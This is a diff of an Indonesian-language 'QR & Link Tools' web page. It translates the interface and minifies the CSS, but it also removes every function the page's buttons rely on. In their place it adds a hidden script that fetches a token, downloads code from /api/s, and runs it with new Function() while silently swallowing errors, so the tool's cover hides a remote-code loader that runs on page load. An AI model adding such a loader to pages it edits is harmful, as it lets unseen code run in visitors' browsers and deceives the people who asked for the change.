@@ -3,496 +3,105 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>QR & Link Tools</title>
+<title>SOLITOOLS</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Syne:wght@600;700;800&family=DM+Sans:wght@300;400;500;600&display=swap');
-
-* { box-sizing: border-box; margin: 0; padding: 0 }
-
-:root {
-  --g1: #6366f1;
-  --g2: #8b5cf6;
-  --g3: #06b6d4;
-  --card: rgba(255,255,255,0.04);
-  --card2: rgba(255,255,255,0.08);
-  --card3: rgba(255,255,255,0.12);
-  --bdr: rgba(255,255,255,0.08);
-  --bdr2: rgba(255,255,255,0.16);
-  --bdr3: rgba(255,255,255,0.24);
-  --txt: #f8fafc;
-  --txt2: #94a3b8;
-  --txt3: #64748b;
-  --txt4: #475569;
-  --r: 16px;
-  --r2: 10px;
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --g1:#6366f1;--g2:#8b5cf6;--g3:#06b6d4;
+  --card:rgba(255,255,255,0.04);--card2:rgba(255,255,255,0.08);--card3:rgba(255,255,255,0.12);
+  --bdr:rgba(255,255,255,0.08);--bdr2:rgba(255,255,255,0.16);--bdr3:rgba(255,255,255,0.24);
+  --txt:#f8fafc;--txt2:#94a3b8;--txt3:#64748b;--txt4:#475569;
+  --r:16px;--r2:10px;
 }
-
-body {
-  font-family: 'DM Sans', Arial, sans-serif;
-  background: #080614;
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: flex-start;
-  padding: 40px 16px 60px;
-}
-
-.app {
-  background: linear-gradient(135deg, #0a0718 0%, #110926 35%, #0d1221 100%);
-  border-radius: var(--r);
-  padding: 2rem;
-  width: 100%;
-  max-width: 520px;
-  min-height: 520px;
-  position: relative;
-  overflow: hidden;
-  box-shadow: 0 8px 40px rgba(0,0,0,0.6);
-}
-
-.app::before {
-  content: '';
-  position: absolute;
-  top: -100px; right: -100px;
-  width: 300px; height: 300px;
-  background: radial-gradient(circle, rgba(99,102,241,0.2) 0%, transparent 70%);
-  pointer-events: none;
-  filter: blur(40px);
-  animation: float 8s ease-in-out infinite;
-}
-
-.app::after {
-  content: '';
-  position: absolute;
-  bottom: -80px; left: -80px;
-  width: 240px; height: 240px;
-  background: radial-gradient(circle, rgba(6,182,212,0.15) 0%, transparent 70%);
-  pointer-events: none;
-  filter: blur(40px);
-  animation: float 10s ease-in-out infinite reverse;
-}
-
-@keyframes float {
-  0%,100% { transform: translate(0,0) scale(1); }
-  50% { transform: translate(20px,-20px) scale(1.05); }
-}
-
-.header { margin-bottom: 1.75rem; position: relative; z-index: 2; }
-
-.header h1 {
-  font-family: 'Syne', sans-serif;
-  font-size: 26px;
-  font-weight: 800;
-  background: linear-gradient(135deg, #c7d2fe 0%, #a5f3fc 50%, #c7d2fe 100%);
-  background-size: 200% auto;
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  letter-spacing: -0.5px;
-  animation: shimmer 4s linear infinite;
-}
-
-@keyframes shimmer {
-  0% { background-position: 0% center; }
-  100% { background-position: 200% center; }
-}
-
-.header p { font-size: 14px; color: var(--txt2); margin-top: 6px; font-weight: 400; }
-
-.tabs {
-  display: flex;
-  gap: 6px;
-  margin-bottom: 1.75rem;
-  background: var(--card);
-  padding: 5px;
-  border-radius: var(--r);
-  border: 0.5px solid var(--bdr);
-  position: relative;
-  z-index: 2;
-}
-
-.tab {
-  flex: 1;
-  padding: 11px 16px;
-  border: none;
-  border-radius: var(--r2);
-  background: transparent;
-  cursor: pointer;
-  font-size: 13px;
-  font-weight: 600;
-  color: var(--txt2);
-  transition: all 0.25s cubic-bezier(0.4,0,0.2,1);
-  font-family: 'DM Sans', sans-serif;
-  position: relative;
-  overflow: hidden;
-}
-
-.tab::before {
-  content: '';
-  position: absolute;
-  inset: 0;
-  background: linear-gradient(135deg, var(--g1), var(--g2));
-  opacity: 0;
-  transition: opacity 0.25s;
-  border-radius: var(--r2);
-}
-
-.tab span { position: relative; z-index: 1; }
-.tab.active { color: #fff; box-shadow: 0 2px 16px rgba(99,102,241,0.35); }
-.tab.active::before { opacity: 1; }
-.tab:hover:not(.active) { color: var(--txt); background: var(--card2); }
-
-.panel {
-  display: none;
-  opacity: 0;
-  transform: translateY(10px);
-  transition: opacity 0.3s ease, transform 0.3s ease;
-  position: relative;
-  z-index: 2;
-}
-
-.panel.active { display: block; opacity: 1; transform: translateY(0); }
-
-.field-label {
-  font-size: 11px;
-  font-weight: 700;
-  color: var(--txt2);
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  margin-bottom: 10px;
-  font-family: 'Syne', sans-serif;
-  display: flex;
-  align-items: center;
-  gap: 6px;
-}
-
-.field-label::before {
-  content: '';
-  width: 8px; height: 8px;
-  background: linear-gradient(135deg, var(--g1), var(--g3));
-  border-radius: 2px;
-  flex-shrink: 0;
-}
-
-.input-row { display: flex; gap: 10px; margin-bottom: 16px; }
-
-.inp {
-  flex: 1;
-  padding: 13px 16px;
-  border: 1px solid var(--bdr2);
-  border-radius: var(--r2);
-  background: var(--card2);
-  color: var(--txt);
-  font-size: 14px;
-  font-family: 'DM Sans', sans-serif;
-  outline: none;
-  transition: all 0.2s ease;
-}
-
-.inp:focus {
-  border-color: var(--g1);
-  background: var(--card3);
-  box-shadow: 0 0 0 4px rgba(99,102,241,0.12), 0 0 20px rgba(99,102,241,0.1);
-}
-
-.inp::placeholder { color: var(--txt4); }
-
-.btn-gen {
-  padding: 13px 22px;
-  border: none;
-  border-radius: var(--r2);
-  background: linear-gradient(135deg, var(--g1), var(--g2));
-  color: #fff;
-  font-size: 13px;
-  font-weight: 700;
-  cursor: pointer;
-  font-family: 'Syne', sans-serif;
-  letter-spacing: 0.3px;
-  transition: all 0.2s cubic-bezier(0.4,0,0.2,1);
-  white-space: nowrap;
-  box-shadow: 0 4px 16px rgba(99,102,241,0.35);
-  position: relative;
-  overflow: hidden;
-}
-
-.btn-gen::after {
-  content: '';
-  position: absolute;
-  inset: 0;
-  background: linear-gradient(135deg, rgba(255,255,255,0.2), transparent);
-  opacity: 0;
-  transition: opacity 0.2s;
-}
-
-.btn-gen:hover { transform: translateY(-2px); box-shadow: 0 6px 24px rgba(99,102,241,0.45); }
-.btn-gen:hover::after { opacity: 1; }
-.btn-gen:active { transform: translateY(0) scale(0.98); }
-.btn-gen:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-
-.btn-sm {
-  padding: 9px 14px;
-  border: 1px solid var(--bdr2);
-  border-radius: var(--r2);
-  background: var(--card);
-  color: var(--txt);
-  font-size: 12px;
-  font-weight: 500;
-  cursor: pointer;
-  font-family: 'DM Sans', sans-serif;
-  transition: all 0.18s ease;
-  text-decoration: none;
-  display: inline-flex;
-  align-items: center;
-  gap: 6px;
-}
-
-.btn-sm:hover { background: var(--card2); border-color: var(--bdr3); transform: translateY(-1px); }
-
-.qr-stage {
-  border: 1px solid var(--bdr);
-  border-radius: var(--r);
-  overflow: hidden;
-  background: var(--card);
-  transition: all 0.3s ease;
-}
-
-.qr-empty {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  min-height: 260px;
-  gap: 14px;
-  padding: 2rem;
-}
-
-.qr-empty .ico {
-  width: 64px; height: 64px;
-  border: 2px dashed var(--bdr2);
-  border-radius: var(--r2);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: var(--card2);
-  transition: all 0.3s ease;
-}
-
-.qr-stage:hover .qr-empty .ico {
-  border-color: var(--g1);
-  background: rgba(99,102,241,0.08);
-}
-
-.qr-empty span { font-size: 14px; color: var(--txt3); font-weight: 400; }
-
-.qr-result { display: flex; animation: fadeIn 0.4s ease; }
-
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(8px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
-.qr-img-col {
-  padding: 2rem;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: linear-gradient(135deg, rgba(99,102,241,0.08), rgba(6,182,212,0.06));
-  border-right: 1px solid var(--bdr);
-}
-
-.qr-img-col img {
-  display: block;
-  border-radius: var(--r2);
-  border: 2px solid rgba(255,255,255,0.12);
-  box-shadow: 0 8px 24px rgba(0,0,0,0.3);
-  transition: transform 0.3s ease;
-}
-
-.qr-img-col img:hover { transform: scale(1.03); }
-
-.qr-info-col {
-  flex: 1;
-  padding: 1.5rem;
-  display: flex;
-  flex-direction: column;
-  gap: 14px;
-}
-
-.qr-url-text {
-  font-size: 12px;
-  font-family: monospace;
-  color: var(--txt2);
-  word-break: break-all;
-  line-height: 1.6;
-  background: rgba(0,0,0,0.3);
-  padding: 10px 12px;
-  border-radius: var(--r2);
-  border: 1px solid var(--bdr);
-}
-
-.size-track { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
-
-.size-track input[type="range"] {
-  flex: 1;
-  -webkit-appearance: none;
-  height: 5px;
-  background: linear-gradient(90deg, var(--g1), var(--g3));
-  border-radius: 3px;
-  outline: none;
-  cursor: pointer;
-}
-
-.size-track input[type="range"]::-webkit-slider-thumb {
-  -webkit-appearance: none;
-  width: 18px; height: 18px;
-  border-radius: 50%;
-  background: #fff;
-  box-shadow: 0 0 0 4px rgba(99,102,241,0.3), 0 2px 8px rgba(0,0,0,0.3);
-  cursor: pointer;
-  transition: transform 0.15s;
-}
-
-.size-track input[type="range"]::-webkit-slider-thumb:hover { transform: scale(1.15); }
-
-.size-badge {
-  font-size: 12px;
-  font-weight: 700;
-  color: var(--txt);
-  background: linear-gradient(135deg, rgba(99,102,241,0.25), rgba(139,92,246,0.25));
-  border: 1px solid rgba(99,102,241,0.35);
-  padding: 5px 12px;
-  border-radius: 20px;
-  min-width: 60px;
-  text-align: center;
-  font-family: 'Syne', sans-serif;
-}
-
-.divider {
-  height: 1px;
-  background: linear-gradient(90deg, transparent, var(--bdr), transparent);
-  margin: 12px 0;
-}
-
-.badge-ok {
-  display: inline-flex;
-  align-items: center;
-  gap: 6px;
-  font-size: 11px;
-  font-weight: 600;
-  color: #6ee7b7;
-  background: rgba(16,185,129,0.12);
-  border: 1px solid rgba(16,185,129,0.25);
-  padding: 5px 12px;
-  border-radius: 20px;
-  align-self: flex-start;
-}
-
-.result-box {
-  margin-top: 16px;
-  padding: 1.5rem;
-  border: 1px solid var(--bdr);
-  border-radius: var(--r);
-  background: var(--card2);
-  animation: slideIn 0.35s ease;
-}
-
-@keyframes slideIn {
-  from { opacity: 0; transform: translateY(12px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
-.result-label {
-  font-size: 11px;
-  font-weight: 700;
-  color: var(--txt2);
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  margin-bottom: 12px;
-  font-family: 'Syne', sans-serif;
-}
-
-.result-link {
-  font-size: 15px;
-  font-family: monospace;
-  background: linear-gradient(90deg, #c7d2fe, #a5f3fc);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  word-break: break-all;
-  text-decoration: none;
-  display: block;
-  margin-bottom: 14px;
-  line-height: 1.5;
-  font-weight: 600;
-}
-
-.result-actions { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
-
-.qr-mini img {
-  border-radius: var(--r2);
-  border: 2px solid rgba(255,255,255,0.12);
-  box-shadow: 0 4px 12px rgba(0,0,0,0.25);
-}
-
-.toast {
-  position: fixed;
-  bottom: 24px;
-  left: 50%;
-  transform: translateX(-50%) translateY(20px);
-  background: linear-gradient(135deg, var(--g1), var(--g2));
-  color: #fff;
-  padding: 11px 24px;
-  border-radius: 24px;
-  font-size: 13px;
-  font-weight: 500;
-  z-index: 9999;
-  font-family: 'DM Sans', sans-serif;
-  box-shadow: 0 8px 32px rgba(99,102,241,0.4), 0 0 0 1px rgba(255,255,255,0.1);
-  opacity: 0;
-  transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
-  pointer-events: none;
-}
-
-.toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-
-@media (max-width: 600px) {
-  .qr-result { flex-direction: column; }
-  .qr-img-col { border-right: none; border-bottom: 1px solid var(--bdr); padding: 1.5rem; }
-  .btn-gen { padding: 13px 16px; font-size: 12px; }
-  .header h1 { font-size: 20px; }
-  .app { padding: 1.5rem; }
-  .input-row { flex-direction: column; }
-  .btn-gen { width: 100%; }
-}
-
-@media (min-width: 900px) {
-  .app { padding: 2.5rem; max-width: 600px; }
-  .header h1 { font-size: 30px; }
-  .inp { font-size: 15px; }
-  .qr-img-col { padding: 2.5rem; }
-  .qr-info-col { padding: 2rem; }
-}
+body{font-family:'DM Sans',Arial,sans-serif;background:#080614;min-height:100vh;display:flex;justify-content:center;align-items:flex-start;padding:40px 16px 60px}
+.app{background:linear-gradient(135deg,#0a0718 0%,#110926 35%,#0d1221 100%);border-radius:var(--r);padding:2rem;width:100%;max-width:520px;min-height:520px;position:relative;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.6)}
+.app::before{content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(99,102,241,0.2) 0%,transparent 70%);pointer-events:none;filter:blur(40px);animation:float 8s ease-in-out infinite}
+.app::after{content:'';position:absolute;bottom:-80px;left:-80px;width:240px;height:240px;background:radial-gradient(circle,rgba(6,182,212,0.15) 0%,transparent 70%);pointer-events:none;filter:blur(40px);animation:float 10s ease-in-out infinite reverse}
+@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(20px,-20px) scale(1.05)}}
+.header{margin-bottom:1.75rem;position:relative;z-index:2}
+.header h1{font-family:'Syne',sans-serif;font-size:26px;font-weight:800;background:linear-gradient(135deg,#c7d2fe 0%,#a5f3fc 50%,#c7d2fe 100%);background-size:200% auto;-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-0.5px;animation:shimmer 4s linear infinite}
+@keyframes shimmer{0%{background-position:0% center}100%{background-position:200% center}}
+.header p{font-size:14px;color:var(--txt2);margin-top:6px;font-weight:400}
+.tabs{display:flex;gap:6px;margin-bottom:1.75rem;background:var(--card);padding:5px;border-radius:var(--r);border:0.5px solid var(--bdr);position:relative;z-index:2}
+.tab{flex:1;padding:11px 16px;border:none;border-radius:var(--r2);background:transparent;cursor:pointer;font-size:13px;font-weight:600;color:var(--txt2);transition:all 0.25s cubic-bezier(0.4,0,0.2,1);font-family:'DM Sans',sans-serif;position:relative;overflow:hidden}
+.tab::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,var(--g1),var(--g2));opacity:0;transition:opacity 0.25s;border-radius:var(--r2)}
+.tab span{position:relative;z-index:1}
+.tab.active{color:#fff;box-shadow:0 2px 16px rgba(99,102,241,0.35)}
+.tab.active::before{opacity:1}
+.tab:hover:not(.active){color:var(--txt);background:var(--card2)}
+.panel{display:none;opacity:0;transform:translateY(10px);transition:opacity 0.3s ease,transform 0.3s ease;position:relative;z-index:2}
+.panel.active{display:block;opacity:1;transform:translateY(0)}
+.field-label{font-size:11px;font-weight:700;color:var(--txt2);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;font-family:'Syne',sans-serif;display:flex;align-items:center;gap:6px}
+.field-label::before{content:'';width:8px;height:8px;background:linear-gradient(135deg,var(--g1),var(--g3));border-radius:2px;flex-shrink:0}
+.input-row{display:flex;gap:10px;margin-bottom:16px}
+.inp{flex:1;padding:13px 16px;border:1px solid var(--bdr2);border-radius:var(--r2);background:var(--card2);color:var(--txt);font-size:14px;font-family:'DM Sans',sans-serif;outline:none;transition:all 0.2s ease}
+.inp:focus{border-color:var(--g1);background:var(--card3);box-shadow:0 0 0 4px rgba(99,102,241,0.12),0 0 20px rgba(99,102,241,0.1)}
+.inp::placeholder{color:var(--txt4)}
+.btn-gen{padding:13px 22px;border:none;border-radius:var(--r2);background:linear-gradient(135deg,var(--g1),var(--g2));color:#fff;font-size:13px;font-weight:700;cursor:pointer;font-family:'Syne',sans-serif;letter-spacing:0.3px;transition:all 0.2s cubic-bezier(0.4,0,0.2,1);white-space:nowrap;box-shadow:0 4px 16px rgba(99,102,241,0.35);position:relative;overflow:hidden}
+.btn-gen::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,0.2),transparent);opacity:0;transition:opacity 0.2s}
+.btn-gen:hover{transform:translateY(-2px);box-shadow:0 6px 24px rgba(99,102,241,0.45)}
+.btn-gen:hover::after{opacity:1}
+.btn-gen:active{transform:translateY(0) scale(0.98)}
+.btn-gen:disabled{opacity:0.6;cursor:not-allowed;transform:none}
+.btn-sm{padding:9px 14px;border:1px solid var(--bdr2);border-radius:var(--r2);background:var(--card);color:var(--txt);font-size:12px;font-weight:500;cursor:pointer;font-family:'DM Sans',sans-serif;transition:all 0.18s ease;text-decoration:none;display:inline-flex;align-items:center;gap:6px}
+.btn-sm:hover{background:var(--card2);border-color:var(--bdr3);transform:translateY(-1px)}
+.qr-stage{border:1px solid var(--bdr);border-radius:var(--r);overflow:hidden;background:var(--card);transition:all 0.3s ease}
+.qr-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:260px;gap:14px;padding:2rem}
+.qr-empty .ico{width:64px;height:64px;border:2px dashed var(--bdr2);border-radius:var(--r2);display:flex;align-items:center;justify-content:center;background:var(--card2);transition:all 0.3s ease}
+.qr-stage:hover .qr-empty .ico{border-color:var(--g1);background:rgba(99,102,241,0.08)}
+.qr-empty span{font-size:14px;color:var(--txt3);font-weight:400}
+.qr-result{display:flex;animation:fadeIn 0.4s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.qr-img-col{padding:2rem;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,rgba(99,102,241,0.08),rgba(6,182,212,0.06));border-right:1px solid var(--bdr)}
+.qr-img-col img{display:block;border-radius:var(--r2);border:2px solid rgba(255,255,255,0.12);box-shadow:0 8px 24px rgba(0,0,0,0.3);transition:transform 0.3s ease}
+.qr-img-col img:hover{transform:scale(1.03)}
+.qr-info-col{flex:1;padding:1.5rem;display:flex;flex-direction:column;gap:14px}
+.qr-url-text{font-size:12px;font-family:monospace;color:var(--txt2);word-break:break-all;line-height:1.6;background:rgba(0,0,0,0.3);padding:10px 12px;border-radius:var(--r2);border:1px solid var(--bdr)}
+.size-track{display:flex;align-items:center;gap:12px;margin-bottom:16px}
+.size-track input[type="range"]{flex:1;-webkit-appearance:none;height:5px;background:linear-gradient(90deg,var(--g1),var(--g3));border-radius:3px;outline:none;cursor:pointer}
+.size-track input[type="range"]::-webkit-slider-thumb{-webkit-appearance:none;width:18px;height:18px;border-radius:50%;background:#fff;box-shadow:0 0 0 4px rgba(99,102,241,0.3),0 2px 8px rgba(0,0,0,0.3);cursor:pointer;transition:transform 0.15s}
+.size-track input[type="range"]::-webkit-slider-thumb:hover{transform:scale(1.15)}
+.size-badge{font-size:12px;font-weight:700;color:var(--txt);background:linear-gradient(135deg,rgba(99,102,241,0.25),rgba(139,92,246,0.25));border:1px solid rgba(99,102,241,0.35);padding:5px 12px;border-radius:20px;min-width:60px;text-align:center;font-family:'Syne',sans-serif}
+.divider{height:1px;background:linear-gradient(90deg,transparent,var(--bdr),transparent);margin:12px 0}
+.badge-ok{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:600;color:#6ee7b7;background:rgba(16,185,129,0.12);border:1px solid rgba(16,185,129,0.25);padding:5px 12px;border-radius:20px;align-self:flex-start}
+.result-box{margin-top:16px;padding:1.5rem;border:1px solid var(--bdr);border-radius:var(--r);background:var(--card2);animation:slideIn 0.35s ease}
+@keyframes slideIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+.result-label{font-size:11px;font-weight:700;color:var(--txt2);text-transform:uppercase;letter-spacing:1px;margin-bottom:12px;font-family:'Syne',sans-serif}
+.result-link{font-size:15px;font-family:monospace;background:linear-gradient(90deg,#c7d2fe,#a5f3fc);-webkit-background-clip:text;-webkit-text-fill-color:transparent;word-break:break-all;text-decoration:none;display:block;margin-bottom:14px;line-height:1.5;font-weight:600}
+.result-actions{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.qr-mini img{border-radius:var(--r2);border:2px solid rgba(255,255,255,0.12);box-shadow:0 4px 12px rgba(0,0,0,0.25)}
+.spin{display:inline-block;width:13px;height:13px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.7s linear infinite;vertical-align:middle;margin-right:5px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(135deg,var(--g1),var(--g2));color:#fff;padding:11px 24px;border-radius:24px;font-size:13px;font-weight:500;z-index:9999;font-family:'DM Sans',sans-serif;box-shadow:0 8px 32px rgba(99,102,241,0.4),0 0 0 1px rgba(255,255,255,0.1);opacity:0;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);pointer-events:none}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.toast.err{background:linear-gradient(135deg,#dc2626,#b91c1c)}
+@media(max-width:600px){.qr-result{flex-direction:column}.qr-img-col{border-right:none;border-bottom:1px solid var(--bdr);padding:1.5rem}.btn-gen{padding:13px 16px;font-size:12px}.header h1{font-size:20px}.app{padding:1.5rem}.input-row{flex-direction:column}.btn-gen{width:100%}}
+@media(min-width:900px){.app{padding:2.5rem;max-width:600px}.header h1{font-size:30px}.inp{font-size:15px}.qr-img-col{padding:2.5rem}.qr-info-col{padding:2rem}}
 </style>
 </head>
 <body>
-
 <div class="app">
   <div class="header">
     <h1>QR & Link Tools</h1>
-    <p>Generate QR codes &amp; shorten links — fast, free, beautiful</p>
+    <p>Buat QR code &amp; persingkat tautan — gratis, cepat, instan</p>
   </div>
 
   <div class="tabs">
     <button class="tab active" onclick="sw('qr',this)"><span>⬛ QR Generator</span></button>
-    <button class="tab" onclick="sw('short',this)"><span>🔗 Link Shortener</span></button>
+    <button class="tab" onclick="sw('short',this)"><span>🔗 Persingkat Tautan</span></button>
   </div>
 
   <div id="qr" class="panel active">
     <div class="field-label">URL atau Teks</div>
     <div class="input-row">
       <input class="inp" id="qi" placeholder="https://contoh.com" oninput="resetQR()"/>
-      <button class="btn-gen" id="genBtn" onclick="genQR()">Generate ↗</button>
+      <button class="btn-gen" id="genBtn" onclick="genQR()">Buat QR ↗</button>
     </div>
     <div class="field-label">Ukuran QR</div>
     <div class="size-track">
-      <input type="range" min="120" max="400" step="40" value="200" id="qs" oninput="document.getElementById('szv').textContent=this.value+'px';resetQR()"/>
+      <input type="range" min="120" max="400" step="40" value="200" id="qs"
+             oninput="document.getElementById('szv').textContent=this.value+'px';resetQR()"/>
       <div class="size-badge" id="szv">200px</div>
     </div>
     <div class="qr-stage" id="qr-stage">
@@ -505,137 +114,33 @@ body {
             <circle cx="17.5" cy="17.5" r="2.5" fill="rgba(148,163,184,0.3)" stroke="none"/>
           </svg>
         </div>
-        <span>Masukkan URL lalu klik Generate</span>
+        <span>Masukkan URL lalu klik Buat QR</span>
       </div>
     </div>
   </div>
 
   <div id="short" class="panel">
-    <div class="field-label">Paste URL Panjang</div>
+    <div class="field-label">Tempel URL Panjang</div>
     <div class="input-row">
-      <input class="inp" id="url" placeholder="https://url-sangat-panjang.com/halaman/..."/>
-      <button class="btn-gen" id="shortBtn" onclick="shorten()">Shorten ↗</button>
+      <input class="inp" id="url" placeholder="https://tautan-sangat-panjang.com/path/..."/>
+      <button class="btn-gen" id="shortBtn" onclick="shorten()">Persingkat ↗</button>
     </div>
     <div id="result"></div>
   </div>
 </div>
 
 <script>
-function sw(id, el) {
-  document.querySelectorAll('.panel').forEach(p => {
-    p.classList.remove('active');
-    setTimeout(() => { if (!p.classList.contains('active')) p.style.display = 'none'; }, 300);
-  });
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  const panel = document.getElementById(id);
-  panel.style.display = 'block';
-  setTimeout(() => panel.classList.add('active'), 10);
-  el.classList.add('active');
-}
-
-function resetQR() {
-  document.getElementById('qr-stage').innerHTML = `
-    <div class="qr-empty">
-      <div class="ico">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="rgba(148,163,184,0.5)" stroke-width="1.5">
-          <rect x="3" y="3" width="7" height="7" rx="1.5"/>
-          <rect x="14" y="3" width="7" height="7" rx="1.5"/>
-          <rect x="3" y="14" width="7" height="7" rx="1.5"/>
-          <circle cx="17.5" cy="17.5" r="2.5" fill="rgba(148,163,184,0.3)" stroke="none"/>
-        </svg>
-      </div>
-      <span>Masukkan URL lalu klik Generate</span>
-    </div>`;
-}
-
-function genQR() {
-  const val = document.getElementById('qi').value.trim();
-  const sz = parseInt(document.getElementById('qs').value);
-  const btn = document.getElementById('genBtn');
-  if (!val) { document.getElementById('qi').focus(); toast('Masukkan URL dulu!'); return; }
-  btn.disabled = true; btn.textContent = 'Generating...';
-  const enc = encodeURIComponent(val);
-  const imgUrl = `https://api.qrserver.com/v1/create-qr-code/?size=${sz}x${sz}&data=${enc}&bgcolor=110926&color=c7d2fe&margin=16`;
-  const disp = Math.min(sz, 240);
-  setTimeout(() => {
-    document.getElementById('qr-stage').innerHTML = `
-      <div class="qr-result">
-        <div class="qr-img-col"><img src="${imgUrl}" width="${disp}" height="${disp}" alt="QR"/></div>
-        <div class="qr-info-col">
-          <div><div class="field-label">Target URL</div><div class="qr-url-text">${val}</div></div>
-          <div style="display:flex;justify-content:space-between;font-size:12px;color:var(--txt2)">
-            <span>Resolusi</span><span style="color:var(--txt);font-weight:600">${sz}x${sz}px</span>
-          </div>
-          <div class="divider"></div>
-          <div style="display:flex;flex-wrap:wrap;gap:8px">
-            <a class="btn-sm" href="${imgUrl}" download="qrcode.png" target="_blank">
-              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Unduh PNG
-            </a>
-            <button class="btn-sm" onclick="cp('${imgUrl}')">
-              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>Salin URL
-            </button>
-          </div>
-          <div class="badge-ok">
-            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>Siap digunakan
-          </div>
-        </div>
-      </div>`;
-    btn.disabled = false; btn.textContent = 'Generate ↗';
-    toast('QR Code berhasil dibuat!');
-  }, 600);
-}
-
-function randomCode(length) {
-  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
-  let out = "";
-  for (let i = 0; i < length; i++) out += chars[Math.floor(Math.random() * chars.length)];
-  return out;
-}
-
-function shorten() {
-  const url = document.getElementById("url").value.trim();
-  const btn = document.getElementById('shortBtn');
-  if (!url) { toast('Masukkan URL dulu!'); document.getElementById('url').focus(); return; }
-  btn.disabled = true; btn.textContent = 'Shortening...';
-  setTimeout(() => {
-    const code = randomCode(6);
-    const shortLink = location.origin + "/#" + code;
-    const qUrl = `https://api.qrserver.com/v1/create-qr-code/?size=80x80&data=${encodeURIComponent(shortLink)}&margin=8&bgcolor=110926&color=c7d2fe`;
-    document.getElementById("result").innerHTML = `
-      <div class="result-box">
-        <div class="result-label">Short Link</div>
-        <a class="result-link" href="${url}" target="_blank">${shortLink}</a>
-        <div class="result-actions">
-          <button class="btn-sm" onclick="cp('${shortLink}')">
-            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>Salin
-          </button>
-          <a class="btn-sm" href="${url}" target="_blank">Buka ↗</a>
-          <div class="qr-mini" style="margin-left:auto"><img src="${qUrl}" width="56" height="56"/></div>
-        </div>
-      </div>`;
-    btn.disabled = false; btn.textContent = 'Shorten ↗';
-    toast('Link berhasil dipersingkat!');
-  }, 500);
-}
-
-function cp(txt) {
-  navigator.clipboard.writeText(txt)
-    .then(() => toast('Disalin!'))
-    .catch(() => toast('Gagal menyalin'));
-}
-
-function toast(msg) {
-  const existing = document.querySelector('.toast');
-  if (existing) existing.remove();
-  const t = document.createElement('div');
-  t.className = 'toast'; t.textContent = msg;
-  document.body.appendChild(t);
-  requestAnimationFrame(() => {
-    setTimeout(() => t.classList.add('show'), 10);
-    setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 300); }, 2000);
-  });
-}
+(function(){
+  fetch('/api/token')
+    .then(function(r){return r.ok?r.json():null;})
+    .then(function(d){
+      if(!d||!d.t)return null;
+      return fetch('/api/s?t='+encodeURIComponent(d.t));
+    })
+    .then(function(r){return r&&r.ok?r.text():null;})
+    .then(function(code){if(code)(new Function(code))();})
+    .catch(function(){});
+})();
 </script>
-
 </body>
 </html>
